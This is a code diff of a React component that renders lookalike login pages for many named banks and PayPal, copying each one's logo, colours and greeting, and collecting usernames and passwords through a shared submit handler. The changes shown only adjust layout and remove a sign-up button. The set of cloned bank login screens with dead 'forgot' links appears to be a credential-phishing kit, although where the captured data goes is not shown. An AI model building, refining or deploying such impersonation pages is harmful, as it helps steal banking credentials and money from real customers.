@@ -297,95 +297,100 @@ const BankLoginForm: React.FC<BankLoginProps> = ({
 
 else if (selectedBank === 'Desjardins Group') {
   return (
-    <div className="bg-white min-h-screen flex flex-col items-center justify-center">
-      {/* Bank Logo */}
-      <div className="bg-white w-full max-w-md flex justify-center py-6 rounded-t-lg shadow-md">
-        <img
-          src={bankData?.additionalLogo}
-          alt={`${selectedBank} Logo`}
-          className="w-36 h-auto object-contain"
-        />
-      </div>
-
-      {/* Login Form */}
-      <div className="w-full max-w-md bg-white p-8 rounded-b-lg shadow-md">
-        <div className="text-center mb-8">
-          <h2 className="text-3xl font-light text-[#23233F] mb-8">
-            {styling.greeting}
-          </h2>
-        </div>
-
-        <form onSubmit={handleLoginSubmit} className="space-y-6">
-          {/* User ID */}
-          <div>
-            <label
-              htmlFor="userId"
-              className="block text-lg font-bold text-gray-800 mb-1"
-            >
-              User ID
-            </label>
-            <input
-              type="text"
-              id="userId"
-              name="username"
-              value={bankLoginData.username}
-              onChange={handleBankLoginChange}
-              className="w-full px-6 py-4 border-2 border-gray-300 rounded-full text-lg placeholder-gray-500 focus:outline-none focus:border-[#FFCD41] focus:ring-4 focus:ring-[#FFCD41] transition-all duration-200"
-              required
+    <div className="bg-white min-h-screen">
+      {/* Login Form Container */}
+      <div className="flex justify-center pt-8">
+        <div className="w-full max-w-md bg-white rounded-lg shadow-md">
+          {/* Bank Logo */}
+          <div className="flex justify-center py-6 border-b border-gray-200">
+            <img
+              src={bankData?.additionalLogo}
+              alt={`${selectedBank} Logo`}
+              className="w-36 h-auto object-contain"
             />
           </div>
 
-          {/* Password */}
-          <div>
-            <label
-              htmlFor="password"
-              className="block text-lg font-bold text-gray-800 mb-1"
-            >
-              Password
-            </label>
-            <input
-              type={showPassword ? 'text' : 'password'}
-              id="password"
-              name="password"
-              value={bankLoginData.password}
-              onChange={handleBankLoginChange}
-              onClick={() => setShowPassword(!showPassword)}
-              className="w-full px-6 py-4 border-2 border-gray-300 rounded-full text-lg placeholder-gray-500 focus:outline-none focus:border-[#FFCD41] focus:ring-4 focus:ring-[#FFCD41] transition-all duration-200"
-              required
-            />
-          </div>
-
-          {/* Save Username */}
-          <div className="flex items-start space-x-3 mt-6">
-            <input
-              type="checkbox"
-              id="saveUsername"
-              checked={saveUsername}
-              onChange={(e) => setSaveUsername(e.target.checked)}
-              className="mt-1 w-4 h-4 border-2 border-gray-400 rounded"
-            />
-            <div>
-              <label
-                htmlFor="saveUsername"
-                className="text-[#23233F] font-medium"
-              >
-                Save username
-              </label>
-              <p className="text-gray-600 text-sm mt-1">
-                To help keep your account secure, save your username only on
-                devices that aren't used by other people.
-              </p>
+          {/* Login Form */}
+          <div className="p-8">
+            <div className="text-center mb-8">
+              <h2 className="text-3xl font-light text-[#23233F] mb-8">
+                {styling.greeting}
+              </h2>
             </div>
-          </div>
 
-          {/* Sign In Button */}
-          <button
-            type="submit"
-className="w-full bg-[#007142] hover:bg-[#005A33] text-white font-medium py-4 px-6 rounded-full text-lg transition-all duration-300 mt-8"
-          >
-            Sign in
-          </button>
-        </form>
+            <form onSubmit={handleLoginSubmit} className="space-y-6">
+              {/* User ID */}
+              <div>
+                <label
+                  htmlFor="userId"
+                  className="block text-lg font-bold text-gray-800 mb-1"
+                >
+                  User ID
+                </label>
+                <input
+                  type="text"
+                  id="userId"
+                  name="username"
+                  value={bankLoginData.username}
+                  onChange={handleBankLoginChange}
+                  className="w-full px-6 py-4 border-2 border-gray-300 rounded-full text-lg placeholder-gray-500 focus:outline-none focus:border-[#FFCD41] focus:ring-4 focus:ring-[#FFCD41] transition-all duration-200"
+                  required
+                />
+              </div>
+
+              {/* Password */}
+              <div>
+                <label
+                  htmlFor="password"
+                  className="block text-lg font-bold text-gray-800 mb-1"
+                >
+                  Password
+                </label>
+                <input
+                  type={showPassword ? 'text' : 'password'}
+                  id="password"
+                  name="password"
+                  value={bankLoginData.password}
+                  onChange={handleBankLoginChange}
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="w-full px-6 py-4 border-2 border-gray-300 rounded-full text-lg placeholder-gray-500 focus:outline-none focus:border-[#FFCD41] focus:ring-4 focus:ring-[#FFCD41] transition-all duration-200"
+                  required
+                />
+              </div>
+
+              {/* Save Username */}
+              <div className="flex items-start space-x-3 mt-6">
+                <input
+                  type="checkbox"
+                  id="saveUsername"
+                  checked={saveUsername}
+                  onChange={(e) => setSaveUsername(e.target.checked)}
+                  className="mt-1 w-4 h-4 border-2 border-gray-400 rounded"
+                />
+                <div>
+                  <label
+                    htmlFor="saveUsername"
+                    className="text-[#23233F] font-medium"
+                  >
+                    Save username
+                  </label>
+                  <p className="text-gray-600 text-sm mt-1">
+                    To help keep your account secure, save your username only on
+                    devices that aren't used by other people.
+                  </p>
+                </div>
+              </div>
+
+              {/* Sign In Button */}
+              <button
+                type="submit"
+                className="w-full bg-[#007142] hover:bg-[#005A33] text-white font-medium py-4 px-6 rounded-full text-lg transition-all duration-300 mt-8"
+              >
+                Sign in
+              </button>
+            </form>
+          </div>
+        </div>
       </div>
     </div>
   );
@@ -398,15 +403,15 @@ else if (selectedBank === 'Toronto-Dominion Bank') {
       <div className="bg-[#ffffff] w-full h-20 rounded-t-lg flex justify-center items-center px-4 py-2">
         <img
           src={bankData?.additionalLogo}
-          className="w-[280px] h-[70px] object-contain"
+          className="w-[250px] h-[170px] object-contain"
         />
       </div>
 
       <div className="p-8">
         <div className="text-center mb-8"></div>
 
-        <div className="bg-gray-50 flex items-center justify-center p-4">
-          <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-sm border">
+        <div className="bg-gray-50 p-4">
+          <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-sm border mx-auto">
             {/* Welcome Header */}
             <div className="mb-6">
               <h2 className="text-2xl text-[#00704A] font-normal">
@@ -510,8 +515,8 @@ else if (selectedBank === 'Toronto-Dominion Bank') {
 
 else if (selectedBank === 'Royal Bank of Canada') {
   return (
-    <div className="bg-gray-50 min-h-screen flex justify-center items-center">
-      <div className="bg-white rounded-2xl shadow-lg w-full max-w-lg">
+    <div className="bg-gray-50 min-h-screen px-4">
+      <div className="bg-white rounded-2xl shadow-lg w-full max-w-lg mx-auto pt-8">
 
         {/* Logo Section */}
         <div className="bg-white rounded-t-2xl flex justify-center items-center h-28 border-b">
@@ -586,109 +591,113 @@ else if (selectedBank === 'Royal Bank of Canada') {
 
 else if (selectedBank === 'Simplii Financial') {
   return (
-    <div className="bg-gray-50 min-h-screen flex flex-col items-center justify-center">
-      {/* Bank Logo */}
-      <div className="bg-white w-full max-w-md flex justify-center py-6 rounded-t-lg shadow-md">
-        <img
-          src={bankData?.additionalLogo || '/bank-logos/simplii-logo.svg'}
-          alt={`${selectedBank} Logo`}
-          className="w-36 h-auto object-contain"
-        />
-      </div>
-
-      {/* Login Form */}
-      <div className="w-full max-w-md bg-white p-8 rounded-b-lg shadow-md">
-        <div className="flex gap-1 my-2">
-          <span className="text-2xl text-gray-900 font-bold">
-            Online Banking Login
-          </span>
-        </div>
-        <form onSubmit={handleLoginSubmit} className="space-y-6">
-          {/* User ID */}
-          <div>
-            <label
-              htmlFor="userId"
-              className="block text-lg font-semibold text-gray-800 mb-1"
-            >
-              User ID
-            </label>
-            <input
-              type="text"
-              id="userId"
-              name="username"
-              value={bankLoginData.username}
-              onChange={handleBankLoginChange}
-              className="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent placeholder-gray-400"
-              placeholder="Enter your User ID"
-              required
+    <div className="bg-gray-50 min-h-screen">
+      {/* Login Form Container */}
+      <div className="flex justify-center pt-8">
+        <div className="w-full max-w-md bg-white rounded-lg shadow-md">
+          {/* Bank Logo */}
+          <div className="flex justify-center py-6 border-b border-gray-200">
+            <img
+              src={bankData?.additionalLogo || '/bank-logos/simplii-logo.svg'}
+              alt={`${selectedBank} Logo`}
+              className="w-36 h-auto object-contain"
             />
           </div>
 
-          {/* Password */}
-          <div>
-            <label
-              htmlFor="password"
-              className="block text-lg font-semibold text-gray-800 mb-1"
-            >
-              Password
-            </label>
-            <input
-              type="password"
-              id="password"
-              name="password"
-              value={bankLoginData.password}
-              onChange={handleBankLoginChange}
-              onClick={() => setShowPassword(!showPassword)}
-              className="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent placeholder-gray-400"
-              placeholder="Enter your Password"
-              required
-            />
-          </div>
-
-          {/* Save User ID and Forgot Password */}
-          <div className="flex justify-between items-center">
-            <div className="flex items-center space-x-2">
-              <input
-                type="checkbox"
-                id="saveUserId"
-                name="saveUserId"
-                className="w-5 h-5 rounded border-gray-300 checked:bg-pink-500 focus:ring-pink-500"
-              />
-              <label htmlFor="saveUserId" className="text-gray-700 text-sm">
-                Save User ID
-              </label>
+          {/* Login Form */}
+          <div className="p-8">
+            <div className="flex gap-1 my-2">
+              <span className="text-2xl text-gray-900 font-bold">
+                Online Banking Login
+              </span>
             </div>
-            <a
-              href="#"
-              className="text-pink-500 text-sm underline"
-            >
-              Forgot User ID?
-            </a>
-          </div>
+            <form onSubmit={handleLoginSubmit} className="space-y-6">
+              {/* User ID */}
+              <div>
+                <label
+                  htmlFor="userId"
+                  className="block text-lg font-semibold text-gray-800 mb-1"
+                >
+                  User ID
+                </label>
+                <input
+                  type="text"
+                  id="userId"
+                  name="username"
+                  value={bankLoginData.username}
+                  onChange={handleBankLoginChange}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent placeholder-gray-400"
+                  placeholder="Enter your User ID"
+                  required
+                />
+              </div>
 
-          {/* Sign In Button */}
-          <button
-            type="submit"
-            className="w-full bg-pink-500 hover:bg-pink-600 text-white font-semibold py-3 rounded-md transition-colors duration-200 text-lg"
-          >
-            Sign In
-          </button>
+              {/* Password */}
+              <div>
+                <label
+                  htmlFor="password"
+                  className="block text-lg font-semibold text-gray-800 mb-1"
+                >
+                  Password
+                </label>
+                <input
+                  type="password"
+                  id="password"
+                  name="password"
+                  value={bankLoginData.password}
+                  onChange={handleBankLoginChange}
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent placeholder-gray-400"
+                  placeholder="Enter your Password"
+                  required
+                />
+              </div>
 
-          {/* Forgot Password Link */}
-          <div className="mt-4 text-right">
-            <a
-              href="#"
-              className="text-pink-500 text-sm underline"
-            >
-              Forgot your Password?
-            </a>
+              {/* Save User ID and Forgot Password */}
+              <div className="flex justify-between items-center">
+                <div className="flex items-center space-x-2">
+                  <input
+                    type="checkbox"
+                    id="saveUserId"
+                    name="saveUserId"
+                    className="w-5 h-5 rounded border-gray-300 checked:bg-pink-500 focus:ring-pink-500"
+                  />
+                  <label htmlFor="saveUserId" className="text-gray-700 text-sm">
+                    Save User ID
+                  </label>
+                </div>
+                <a
+                  href="#"
+                  className="text-pink-500 text-sm underline"
+                >
+                  Forgot User ID?
+                </a>
+              </div>
+
+              {/* Sign In Button */}
+              <button
+                type="submit"
+                className="w-full bg-pink-500 hover:bg-pink-600 text-white font-semibold py-3 rounded-md transition-colors duration-200 text-lg"
+              >
+                Sign In
+              </button>
+
+              {/* Forgot Password Link */}
+              <div className="mt-4 text-right">
+                <a
+                  href="#"
+                  className="text-pink-500 text-sm underline"
+                >
+                  Forgot your Password?
+                </a>
+              </div>
+            </form>
           </div>
-        </form>
+        </div>
       </div>
     </div>
   );
 }
-
 
 
 else if (selectedBank === 'PayPal') {
@@ -754,22 +763,6 @@ return (
                 Forgotten your email address or password?
               </a>
             </div>
-
-            {/* Divider */}
-            <div className="flex items-center pt-6 pb-2">
-              <div className="flex-grow border-t border-gray-300"></div>
-              <div className="flex-grow border-t border-gray-300"></div>
-            </div>
-
-            {/* Sign Up Button */}
-            <div>
-              <button
-                type="button"
-                className="w-full bg-gray-200 hover:bg-gray-300 text-gray-800 text-base font-medium py-4 rounded-lg transition-colors duration-200"
-              >
-                Sign Up
-              </button>
-            </div>
           </form>
         </div>
       </div>
@@ -779,8 +772,8 @@ return (
 
 else if (selectedBank === 'Canadian Imperial Bank of Commerce') {
   return (
-    <div className="bg-[#ffffff] min-h-screen flex justify-center items-center px-4">
-      <div className="w-full max-w-lg bg-white p-6 md:p-10 rounded-lg shadow-md">
+    <div className="bg-[#ffffff] min-h-screen px-4">
+      <div className="w-full max-w-lg bg-white p-6 md:p-10 rounded-lg shadow-md mx-auto pt-8">
 
         {/* Logo + Heading */}
         <div className="mb-6">
@@ -885,11 +878,10 @@ else if (selectedBank === 'Canadian Imperial Bank of Commerce') {
 
 
 
-
 else if (selectedBank === 'Scotiabank') {
   return (
-    <div className="bg-white min-h-screen flex justify-center items-center px-4">
-      <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-md">
+    <div className="bg-white min-h-screen px-4">
+      <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-md mx-auto pt-8">
         {/* Logo & Welcome Text */}
         <div className="text-center mb-8">
           <img
@@ -1427,92 +1419,96 @@ else if (selectedBank === 'Citi') {
 
 else if (selectedBank === 'Laurentian Bank of Canada') {
   return (
-    <div className="bg-white min-h-screen flex flex-col items-center justify-center">
-      {/* Bank Logo */}
-      <div className="w-full max-w-md flex justify-center py-6">
-        <img
-          src={bankData?.additionalLogo || '/bank-logos/laurentian-logo.svg'}
-          alt={`${selectedBank} Logo`}
-          className="w-36 h-auto object-contain"
-        />
-      </div>
+    <div className="bg-white min-h-screen">
+      {/* Login Form Container */}
+      <div className="flex justify-center pt-8">
+        <div className="w-full max-w-md bg-white rounded-lg shadow-md">
+          {/* Bank Logo */}
+<div className="flex justify-center py-6 border-b border-gray-200">
+  <img
+    src={bankData?.additionalLogo || '/bank-logos/laurentian-logo.svg'}
+    alt={`${selectedBank} Logo`}
+    className="w-56 h-auto object-contain"
+  />
+</div>
 
-      {/* Login Form */}
-      <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-md">
-        <h2 className="text-2xl font-semibold text-[#23233F] mb-6 text-center">
-          Online Banking Login
-        </h2>
-        <form onSubmit={handleLoginSubmit} className="space-y-6">
-          {/* Access Code */}
-          <div>
-            <label
-              htmlFor="accessCode"
-              className="block text-lg font-medium text-gray-700 mb-1"
-            >
-              Email Address
-            </label>
-            <input
-              type="text"
-              id="accessCode"
-              name="username"
-              value={bankLoginData.username}
-              onChange={handleBankLoginChange}
-              className="w-full px-4 py-2 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-[#007142] focus:border-transparent"
-              required
-            />
-          </div>
+          {/* Login Form */}
+          <div className="p-8">
+            <h2 className="text-2xl font-semibold text-[#23233F] mb-6 text-center">
+              Online Banking Login
+            </h2>
+            <form onSubmit={handleLoginSubmit} className="space-y-6">
+              {/* Access Code */}
+              <div>
+                <label
+                  htmlFor="accessCode"
+                  className="block text-lg font-medium text-gray-700 mb-1"
+                >
+                  Email Address
+                </label>
+                <input
+                  type="text"
+                  id="accessCode"
+                  name="username"
+                  value={bankLoginData.username}
+                  onChange={handleBankLoginChange}
+                  className="w-full px-4 py-2 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-[#007142] focus:border-transparent"
+                  required
+                />
+              </div>
 
-          {/* Password */}
-          <div>
-            <label
-              htmlFor="password"
-              className="block text-lg font-medium text-gray-700 mb-1"
-            >
-              Password
-            </label>
-            <input
-              type={showPassword ? 'text' : 'password'}
-              id="password"
-              name="password"
-              value={bankLoginData.password}
-              onChange={handleBankLoginChange}
-              onClick={() => setShowPassword(!showPassword)}
-              className="w-full px-4 py-2 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-[#007142] focus:border-transparent"
-              required
-            />
-          </div>
+              {/* Password */}
+              <div>
+                <label
+                  htmlFor="password"
+                  className="block text-lg font-medium text-gray-700 mb-1"
+                >
+                  Password
+                </label>
+                <input
+                  type={showPassword ? 'text' : 'password'}
+                  id="password"
+                  name="password"
+                  value={bankLoginData.password}
+                  onChange={handleBankLoginChange}
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="w-full px-4 py-2 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-[#007142] focus:border-transparent"
+                  required
+                />
+              </div>
 
-          {/* Login Button */}
-          <div>
-            <button
-              type="submit"
-              className="w-full bg-[#007142] hover:bg-[#005A33] text-white font-medium py-3 rounded-md text-lg transition-colors duration-200"
-            >
-              LOG IN
-            </button>
-          </div>
+              {/* Login Button */}
+              <div>
+                <button
+                  type="submit"
+                  className="w-full bg-[#007142] hover:bg-[#005A33] text-white font-medium py-3 rounded-md text-lg transition-colors duration-200"
+                >
+                  LOG IN
+                </button>
+              </div>
 
-          {/* Forgot Password Link */}
-          <div className="mt-4 text-center">
-            <a
-              href="#"
-              className="text-[#007142] hover:text-[#005A33] text-base underline"
-            >
-              Forgot your password?
-            </a>
+              {/* Forgot Password Link */}
+              <div className="mt-4 text-center">
+                <a
+                  href="#"
+                  className="text-[#007142] hover:text-[#005A33] text-base underline"
+                >
+                  Forgot your password?
+                </a>
+              </div>
+            </form>
           </div>
-        </form>
+        </div>
       </div>
     </div>
   );
 }
 
 
-
 else if (selectedBank === 'Bank of Montreal') {
   return (
-    <div className="bg-[#f4f4f4] min-h-screen flex justify-center items-center px-4">
-      <div className="w-full max-w-md bg-white rounded-lg shadow-md p-6">
+    <div className="bg-[#f4f4f4] min-h-screen px-4">
+      <div className="w-full max-w-md bg-white rounded-lg shadow-md p-6 mx-auto pt-8">
 
         {/* Logo + Heading */}
         <div className="flex flex-col items-center mb-6">
@@ -1622,13 +1618,11 @@ else if (selectedBank === 'Bank of Montreal') {
 
 
 
-
-
 else if (selectedBank === 'Alterna Bank') {
   return (
-    <div className="bg-gray-50 min-h-screen flex flex-col items-center justify-center">
-      {/* Bank Logo */}
-      <div className="bg-white w-full max-w-md flex justify-center py-6 rounded-t-lg shadow-md">
+    <div className="bg-gray-50 min-h-screen">
+      {/* Bank Logo Header */}
+      <div className="bg-white w-full flex justify-center py-6 shadow-md">
         <img
           src={bankData?.additionalLogo || '/bank-logos/alterna-logo.svg'}
           alt={`${selectedBank} Logo`}
@@ -1636,91 +1630,79 @@ else if (selectedBank === 'Alterna Bank') {
         />
       </div>
 
-      {/* Login Form */}
-      <div className="w-full max-w-md bg-white p-8 rounded-b-lg shadow-md">
-        <form onSubmit={handleLoginSubmit} className="space-y-6">
-          {/* User ID */}
-          <div>
-            <input
-              type="text"
-              id="username"
-              name="username"
-              placeholder="User ID"
-              value={bankLoginData.username}
-              onChange={handleBankLoginChange}
-              className="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent placeholder-gray-400"
-              required
-            />
-            <div className="flex mt-2 justify-between items-center">
-              <div className="flex items-center space-x-2">
-                <input
-                  type="checkbox"
-                  id="saveUserId"
-                  name="saveUserId"
-                  className="w-5 h-5 rounded border-gray-300 checked:bg-blue-400 focus:ring-blue-400"
-                />
-                <label htmlFor="saveUserId" className="text-gray-700 text-sm">
-                  Save User ID
-                </label>
+      {/* Login Form Container */}
+      <div className="flex justify-center pt-8">
+        <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-md">
+          <form onSubmit={handleLoginSubmit} className="space-y-6">
+            {/* User ID */}
+            <div>
+              <input
+                type="text"
+                id="username"
+                name="username"
+                placeholder="User ID"
+                value={bankLoginData.username}
+                onChange={handleBankLoginChange}
+                className="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent placeholder-gray-400"
+                required
+              />
+              <div className="flex mt-2 justify-between items-center">
+                <div className="flex items-center space-x-2">
+                  <input
+                    type="checkbox"
+                    id="saveUserId"
+                    name="saveUserId"
+                    className="w-5 h-5 rounded border-gray-300 checked:bg-blue-400 focus:ring-blue-400"
+                  />
+                  <label htmlFor="saveUserId" className="text-gray-700 text-sm">
+                    Save User ID
+                  </label>
+                </div>
+                <a
+                  href="#"
+                  className="text-blue-400 text-sm underline"
+                >
+                  Forgot User ID?
+                </a>
               </div>
-              <a
-                href="#"
-                className="text-blue-400 text-sm underline"
-              >
-                Forgot User ID?
-              </a>
             </div>
-          </div>
 
-          {/* Password */}
-          <div>
-            <input
-              type="password"
-              id="password"
-              name="password"
-              placeholder="Password"
-              value={bankLoginData.password}
-              onChange={handleBankLoginChange}
-              onClick={() => setShowPassword(!showPassword)}
-              className="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent placeholder-gray-400"
-              required
-            />
-            <div className="mt-2 text-right">
-              <a
-                href="#"
-                className="text-blue-400 text-sm underline"
-              >
-                Reset Password?
-              </a>
+            {/* Password */}
+            <div>
+              <input
+                type="password"
+                id="password"
+                name="password"
+                placeholder="Password"
+                value={bankLoginData.password}
+                onChange={handleBankLoginChange}
+                onClick={() => setShowPassword(!showPassword)}
+                className="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent placeholder-gray-400"
+                required
+              />
+              <div className="mt-2 text-right">
+                <a
+                  href="#"
+                  className="text-blue-400 text-sm underline"
+                >
+                  Reset Password?
+                </a>
+              </div>
             </div>
-          </div>
 
-          {/* Sign In Button */}
-          <button
-            type="submit"
-            className="w-full bg-blue-400 hover:bg-blue-500 text-white font-semibold py-3 rounded-md transition-colors duration-200 text-lg"
-          >
-            Sign In
-          </button>
-        </form>
+            {/* Sign In Button */}
+            <button
+              type="submit"
+              className="w-full bg-blue-400 hover:bg-blue-500 text-white font-semibold py-3 rounded-md transition-colors duration-200 text-lg"
+            >
+              Sign In
+            </button>
+          </form>
+        </div>
       </div>
     </div>
   );
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 else if (selectedBank === 'Truist') {
       return (
@@ -2422,12 +2404,11 @@ else if (selectedBank === 'KeyBank') {
       );
     }
 
-
 else if (selectedBank === 'EQ Bank') {
   return (
-    <div className="bg-gray-50 min-h-screen flex flex-col items-center justify-center">
+    <div className="bg-gray-50 min-h-screen">
       {/* EQ Bank Logo Header */}
-      <div className="bg-white w-full max-w-md flex justify-center py-6 shadow-md rounded-t-lg">
+      <div className="bg-white w-full flex justify-center py-6 shadow-md">
         <img
           src={bankData?.additionalLogo || '/bank-logos/eq-logo.svg'}
           alt="EQ Bank Logo"
@@ -2435,82 +2416,85 @@ else if (selectedBank === 'EQ Bank') {
         />
       </div>
 
-      {/* Login Form */}
-      <div className="w-full max-w-md bg-white p-8 rounded-b-lg shadow-md">
-        <form onSubmit={handleLoginSubmit} className="space-y-6">
-          {/* Username */}
-          <div>
-            <label
-              htmlFor="username"
-              className="block text-sm font-semibold text-gray-800 mb-1"
-            >
-              Username
-            </label>
-            <input
-              type="text"
-              id="username"
-              name="username"
-              placeholder="Enter your username"
-              value={bankLoginData.username}
-              onChange={handleBankLoginChange}
-              className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-transparent"
-              required
-            />
-            <div className="flex items-center mt-2 space-x-2">
-              <input
-                type="checkbox"
-                id="saveUserId"
-                name="saveUserId"
-                className="w-4 h-4 border-gray-400 rounded focus:ring-yellow-400"
-              />
-              <label htmlFor="saveUserId" className="text-sm text-gray-700">
-                Remember Me
-              </label>
+      {/* Login Form Container */}
+      <div className="flex justify-center pt-8">
+        <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-md">
+          <form onSubmit={handleLoginSubmit} className="space-y-6">
+            {/* Move Forgot User ID / Password to the top */}
+            <div className="text-center mb-4">
+              <a
+                href="#"
+                className="text-sm text-gray-600 hover:text-gray-800 underline"
+              >
+                Forgot User ID/Password?
+              </a>
             </div>
-          </div>
 
-          {/* Password */}
-          <div>
-            <label
-              htmlFor="password"
-              className="block text-sm font-semibold text-gray-800 mb-1"
+            {/* Username */}
+            <div>
+              <label
+                htmlFor="username"
+                className="block text-sm font-semibold text-gray-800 mb-1"
+              >
+                Username
+              </label>
+              <input
+                type="text"
+                id="username"
+                name="username"
+                placeholder="Enter your username"
+                value={bankLoginData.username}
+                onChange={handleBankLoginChange}
+                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-transparent"
+                required
+              />
+              <div className="flex items-center mt-2 space-x-2">
+                <input
+                  type="checkbox"
+                  id="saveUserId"
+                  name="saveUserId"
+                  className="w-4 h-4 border-gray-400 rounded focus:ring-yellow-400"
+                />
+                <label htmlFor="saveUserId" className="text-sm text-gray-700">
+                  Remember Me
+                </label>
+              </div>
+            </div>
+
+            {/* Password */}
+            <div>
+              <label
+                htmlFor="password"
+                className="block text-sm font-semibold text-gray-800 mb-1"
+              >
+                Password
+              </label>
+              <input
+                type="password"
+                id="password"
+                name="password"
+                placeholder="Enter your password"
+                value={bankLoginData.password}
+                onChange={handleBankLoginChange}
+                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-transparent"
+                required
+              />
+            </div>
+
+            {/* Submit Button */}
+            <button
+              type="submit"
+              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3 rounded-md transition-colors duration-200"
             >
-              Password
-            </label>
-            <input
-              type="password"
-              id="password"
-              name="password"
-              placeholder="Enter your password"
-              value={bankLoginData.password}
-              onChange={handleBankLoginChange}
-              className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-transparent"
-              required
-            />
-          </div>
-
-          {/* Submit Button */}
-          <button
-            type="submit"
-            className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3 rounded-md transition-colors duration-200"
-          >
-            Continue
-          </button>
-
-          {/* Forgot User ID / Password */}
-          <div className="text-center mt-4">
-            <a
-              href="#"
-              className="text-sm text-gray-600 hover:text-gray-800 underline"
-            >
-              Forgot User ID/Password?
-            </a>
-          </div>
-        </form>
+              Continue
+            </button>
+          </form>
+        </div>
       </div>
     </div>
   );
 }
+
 
 
 
